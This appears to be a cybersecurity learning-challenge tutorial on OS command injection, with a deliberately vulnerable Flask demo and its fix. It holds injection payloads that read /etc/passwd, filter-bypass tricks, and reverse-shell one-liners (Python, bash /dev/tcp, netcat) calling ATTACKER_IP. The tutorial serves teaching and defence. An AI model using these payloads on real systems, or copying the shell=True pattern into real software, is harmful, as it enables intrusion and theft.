# Day 034 - Command Injection & OS Command Execution

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate

---

## 🧠 The Concept

SQL injection inserts malicious code into a database query.

Command injection inserts malicious code into an OS shell command.

The impact is immediate and severe - arbitrary commands on the underlying operating system. File system access, network access, credential theft, reverse shells.

If SQLi gives you the database, command injection gives you the server.

---

## ⚙️ How It Happens

A common pattern - application runs a system command using user input:

```python
# Vulnerable Python
import os
def ping(host):
    os.system("ping -c 1 " + host)

ping("8.8.8.8")          # legitimate
ping("8.8.8.8; whoami")  # injected
```

The shell receives: `ping -c 1 8.8.8.8; whoami`

Semicolon separates commands. Both execute. `whoami` returns the server's user.

---

## 💉 Injection Operators

Different operators chain commands differently:

```bash
# Semicolon - run both regardless of outcome
cmd1 ; cmd2

# AND - run cmd2 only if cmd1 succeeds
cmd1 && cmd2

# OR - run cmd2 only if cmd1 fails
cmd1 || cmd2

# Pipe - send cmd1 output to cmd2
cmd1 | cmd2

# Backtick / $() - substitute command output inline
`cmd2`
$(cmd2)

# Newline - works like semicolon, often bypasses filters
cmd1 %0a cmd2
```

---

## 🧪 Detection Payloads

```bash
# Confirm injection exists - time delay (blind)
8.8.8.8; sleep 5          → page delays 5s = vulnerable
8.8.8.8 | sleep 5
8.8.8.8 && sleep 5
8.8.8.8 `sleep 5`
8.8.8.8 $(sleep 5)

# Confirm injection - output (in-band)
8.8.8.8; whoami
8.8.8.8 | id
8.8.8.8 && cat /etc/passwd
127.0.0.1 & cat /etc/passwd &   # Windows
127.0.0.1 | type C:\Windows\win.ini   # Windows
```

---

## 🚀 Escalation - Reverse Shell

Once command injection is confirmed, get an interactive shell:

```bash
# Python reverse shell
8.8.8.8; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Bash reverse shell
8.8.8.8; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Netcat reverse shell
8.8.8.8; nc ATTACKER_IP 4444 -e /bin/bash

# Set up listener first (on your Kali):
nc -lvnp 4444
```

---

## 🚧 Filter Bypasses

```bash
# Spaces filtered → use ${IFS} (Internal Field Separator)
cat${IFS}/etc/passwd
cat${IFS}${IFS}/etc/passwd

# Spaces → use tab
cat	/etc/passwd    (actual tab character)

# Keywords filtered (cat, whoami)
# Wildcard expansion
/bin/ca?  /etc/passwd      # ? matches any single char
/bin/c*t  /etc/passwd      # * matches any string
wh*ami                     # whoami with wildcard

# Variable insertion to break up filtered words
w$()hoami
wh$(echo '')oami

# Base64 encoding
echo "whoami" | base64         → d2hvYW1pCg==
echo d2hvYW1pCg== | base64 -d | bash

# Hex encoding
$(printf '\x77\x68\x6f\x61\x6d\x69')   # whoami in hex
```

---

## 💻 The Code - Command Injection Demo

```python
"""
Day 034 - Command Injection Demo
100 Days of Cybersecurity by Sudeep Ravichandran

Demonstrates OS command injection vulnerability
and the correct fix using subprocess with args list.

Run: python3 command_injection.py
Requires: pip install flask
"""

from flask import Flask, request, jsonify
import subprocess
import shlex

app = Flask(__name__)


# ── Vulnerable ────────────────────────────────────────────────
@app.route("/ping/vulnerable")
def ping_vulnerable():
    """❌ User input concatenated into shell command."""
    host = request.args.get("host", "")
    import os

    # VULNERABLE: shell=True + string concatenation
    result = subprocess.run(
        "ping -c 1 " + host,
        shell=True, capture_output=True, text=True, timeout=10
    )
    return jsonify({
        "command": f"ping -c 1 {host}",
        "output": result.stdout + result.stderr,
        "warning": "VULNERABLE - try: ?host=8.8.8.8;whoami"
    })


# ── Secure ────────────────────────────────────────────────────
@app.route("/ping/secure")
def ping_secure():
    """✅ Arguments passed as list - no shell interpretation."""
    host = request.args.get("host", "")

    # Input validation - only allow valid IP/hostname characters
    import re
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
        return jsonify({"error": "Invalid host - only alphanumeric, dots, hyphens allowed"}), 400

    # SECURE: args as list, shell=False (default)
    result = subprocess.run(
        ["ping", "-c", "1", host],   # ← each arg separate, no shell
        capture_output=True, text=True, timeout=10
    )
    return jsonify({
        "output": result.stdout + result.stderr
    })


if __name__ == "__main__":
    print("=" * 50)
    print("  Command Injection Demo - Day 034")
    print("  100 Days of Cybersecurity")
    print("=" * 50)
    print("\nVulnerable: GET /ping/vulnerable?host=8.8.8.8")
    print("Inject:     GET /ping/vulnerable?host=8.8.8.8;whoami")
    print("Secure:     GET /ping/secure?host=8.8.8.8")
    print("\nServer: http://127.0.0.1:5000\n")
    app.run(debug=False)
```

**To run:**
```bash
pip install flask
python3 command_injection.py
```

---

## 🛡️ Prevention

| Defence | How |
|---------|-----|
| Avoid shell commands | Use library functions instead - `os.path`, `subprocess` with list args |
| Args as list | `subprocess.run(["ping", "-c", "1", host])` - no shell interpretation |
| Input validation | Whitelist expected characters - alphanumeric only for hostnames |
| Least privilege | App user has minimal OS permissions - limits blast radius |
| Shell=False | Never use `shell=True` with user input |

**The fix in one line:**
```python
# VULNERABLE
subprocess.run("ping -c 1 " + host, shell=True)

# SECURE
subprocess.run(["ping", "-c", "1", host])  # shell=False is default
```

When args are a list - the shell never parses them. Semicolons, pipes, and backticks are treated as literal characters.

---

## 🔑 Key Takeaways

- Command injection gives OS-level access - more severe than most web vulnerabilities
- Time-based detection (sleep 5) confirms blind injection when no output is visible
- Reverse shells convert command injection into interactive sessions
- Filter bypasses: `${IFS}`, wildcards, base64, variable insertion
- The fix: never use `shell=True` with user input - pass args as a list
- Any feature that runs system commands is a potential injection point: ping, traceroute, DNS lookup, image processing, file conversion

---

## 📚 Resources
- [PortSwigger Command Injection Labs (free)](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [Reverse Shell Generator](https://www.revshells.com/)

---

## [⬅️ Day 033](../day033/) | [➡️ Day 035](../day035/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*